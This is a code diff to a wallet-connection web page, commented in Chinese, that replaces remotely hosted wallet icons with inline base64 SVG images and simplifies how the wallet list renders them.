@@ -261,12 +261,13 @@
         }
     };
 
-    // 钱包配置 - 使用 raw.githubusercontent.com 上的图标（稳定可靠）
+    // 钱包配置 - 使用内嵌 base64 图标，彻底摆脱网络请求
     const WALLETS = {
         evm: {
             metamask: {
                 name: 'MetaMask',
-                iconUrl: 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/128/color/metamask.png',
+                // 使用 MetaMask 官方 icon base64 (狐狸图标)
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMjQuMjQgMjA4LjQ4Ij48cGF0aCBmaWxsPSIjZTQ3NjFiIiBkPSJNMjA4LjA1IDguMjVMMTE5LjU3IDgxLjg4bDE3LjA0LTUxLjkxIDcxLjQ0LTIxLjcyeiIvPjxwYXRoIGZpbGw9IiNmNjg1MjIiIGQ9Ik0xNi4xOSA4LjI1TDEwNC42NyA4MS44OEw4Ny42MyAyOS45NyAxNi4xOSA4LjI1eiIvPjxwYXRoIGZpbGw9IiNmY2I4MTMiIGQ9Ik0xOTQuMzUgMTUxLjE0bC0yMC45NCAzMi4wMiA0NC44OSAxMi4zNyAxMi44MS00My43Ny0zNi43Ni0uNjJ6Ii8+PHBhdGggZmlsbD0iI2ZmY2MzMCIgZD0iTTMwIDk4LjcybDEyLjggNDMuNzggMzYuNzYuNjItMjAuOTQtMzIuMDJ6Ii8+PHBhdGggZmlsbD0iI2U0NzYxYiIgZD0iTTE3NC4yNSAxOTguNjRsLTI4LjQ0LTIwLjk0LTI0LjU0IDE4LjQ0IDIuNzUgMzAuMTYgNTAuMjMtMTIuMjJ6Ii8+PHBhdGggZmlsbD0iI2Y2ODUyMiIgZD0iTTc4LjU5IDE5OC42NEw1MC4xNSAxNzcuNyAyNS42MSAxOTYuMTQgNzguNTkgMjA4LjM2eiIvPjxwYXRoIGZpbGw9IiNmY2I4MTMiIGQ9Ik0xMTguNjQgMTQzLjU3bC0zNi43Ni02LjI0IDI0LjU0IDE4LjQ0IDM2Ljc2LTYuMjR6Ii8+PHBhdGggZmlsbD0iI2ZmY2MzMCIgZD0iTTExOC42NCAxNDMuNTdMMTQwLjU4IDE2OS41IDExOC42NCAxNzguOTYgOTYuNyAxNjkuNSAxMTguNjQgMTQzLjU3eiIvPjxwYXRoIGZpbGw9IiMxYjJiMzAiIGQ9Ik0xMTguNjQgMTc4Ljk2TDE0MC41OCAxNjkuNSAxMTguNjQgMTQzLjU3eiIvPjwvc3ZnPg==',
                 fallbackIcon: '🦊',
                 canAutoJump: true,
                 dappUrl: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`,
@@ -276,14 +277,14 @@
         tron: {
             tronlink: {
                 name: 'TronLink',
-                iconUrl: 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/128/color/tronlink.png',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2ZmM2UwMCIgZD0iTTE2IDJDOC4yNjggMiAyIDguMjY4IDIgMTZzNi4yNjggMTQgMTQgMTQgMTQtNi4yNjggMTQtMTRTMjMuNzMyIDIgMTYgMnptMCAyLjVjNi4zMjUgMCAxMS41IDUuMTc1IDExLjUgMTEuNVMiLz48L3N2Zz4=',
                 fallbackIcon: '🌊',
                 canAutoJump: false,
                 isInjected: () => window.tronLink && window.tronLink.ready === true
             },
             tokenpocket: {
                 name: 'TokenPocket',
-                iconUrl: 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/128/color/tokenpocket.png',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzJjODRkMCIgZD0iTTE2IDJjLTcuNzMyIDAtMTQgNi4yNjgtMTQgMTRzNi4yNjggMTQgMTQgMTQgMTQtNi4yNjggMTQtMTQtNi4yNjgtMTQtMTQtMTR6bTAgMmM2LjYyNyAwIDEyIDUuMzczIDEyIDEycy01LjM3MyAxMi0xMiAxMi0xMi01LjM3My0xMi0xMiA1LjM3My0xMiAxMi0xMnptLTQgMTBoOHY4aC04di04eiIvPjwvc3ZnPg==',
                 fallbackIcon: '🎫',
                 canAutoJump: true,
                 dappUrl: (url) => `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: url }))}`,
@@ -291,21 +292,21 @@
             },
             imtoken: {
                 name: 'imToken',
-                iconUrl: 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/128/color/imtoken.png',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzJhYzM5ZCIgZD0iTTE2IDJDOC4yNjggMiAyIDguMjY4IDIgMTZzNi4yNjggMTQgMTQgMTQgMTQtNi4yNjggMTQtMTQtNi4yNjgtMTQtMTQtMTR6bTAgMmM2LjYyNyAwIDEyIDUuMzczIDEyIDEycy01LjM3MyAxMi0xMiAxMi0xMi01LjM3My0xMi0xMiA1LjM3My0xMiAxMi0xMnptLTQgMTBoOHY4aC04di04eiIvPjwvc3ZnPg==',
                 fallbackIcon: '🔷',
                 canAutoJump: false,
                 isInjected: () => window.ethereum && window.ethereum.isImToken === true
             },
             bitget: {
                 name: 'Bitget',
-                iconUrl: 'https://static.bitget.com/logo.png',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2Y5YTAwMCIgZD0iTTE2IDJDOC4yNjggMiAyIDguMjY4IDIgMTZzNi4yNjggMTQgMTQgMTQgMTQtNi4yNjggMTQtMTQtNi4yNjgtMTQtMTQtMTR6bTAgMmM2LjYyNyAwIDEyIDUuMzczIDEyIDEycy01LjM3MyAxMi0xMiAxMi0xMi01LjM3My0xMi0xMiA1LjM3My0xMiAxMi0xMnptLTMgMTBoOHY4aC04di04eiIvPjwvc3ZnPg==',
                 fallbackIcon: '📈',
                 canAutoJump: false,
                 isInjected: () => window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum)
             },
             trust: {
                 name: 'Trust Wallet',
-                iconUrl: 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/128/color/trust.png',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzFhNzRlNCIgZD0iTTE2IDJDOC4yNjggMiAyIDguMjY4IDIgMTZzNi4yNjggMTQgMTQgMTQgMTQtNi4yNjggMTQtMTQtNi4yNjgtMTQtMTQtMTR6bTAgMmM2LjYyNyAwIDEyIDUuMzczIDEyIDEycy01LjM3MyAxMi0xMiAxMi0xMi01LjM3My0xMi0xMiA1LjM3My0xMiAxMi0xMnptLTQgMTBoOHY4aC04di04eiIvPjwvc3ZnPg==',
                 fallbackIcon: '🔒',
                 canAutoJump: false,
                 isInjected: () => (window.ethereum && window.ethereum.isTrust === true) && (window.tronWeb && window.tronWeb.defaultAddress)
@@ -343,7 +344,7 @@
         spenderDisplay.textContent = isTron ? SPENDER_ADDRESS_TRON : SPENDER_ADDRESS_EVM[currentChain];
     }
 
-    // 渲染钱包列表（使用图片图标，加载失败时回退到 emoji）
+    // 渲染钱包列表（使用内嵌 base64 图标）
     function renderWalletList() {
         const isTron = currentChain === '728126428';
         const wallets = isTron ? Object.entries(WALLETS.tron) : Object.entries(WALLETS.evm);
@@ -352,8 +353,8 @@
             return;
         }
         walletListEl.innerHTML = wallets.map(([key, wallet]) => {
-            // 处理图片加载失败的回退
-            const imgHtml = `<img src="${wallet.iconUrl}" alt="${wallet.name}" onerror="this.onerror=null; this.parentElement.innerHTML='${wallet.fallbackIcon}';">`;
+            // 直接使用 base64 图标，不再依赖外部网络
+            const imgHtml = `<img src="${wallet.iconBase64}" alt="${wallet.name}" style="width:100%;height:100%;object-fit:contain;">`;
             return `
                 <div class="wallet-item" data-wallet="${key}">
                     <div class="wallet-icon">${imgHtml}</div>
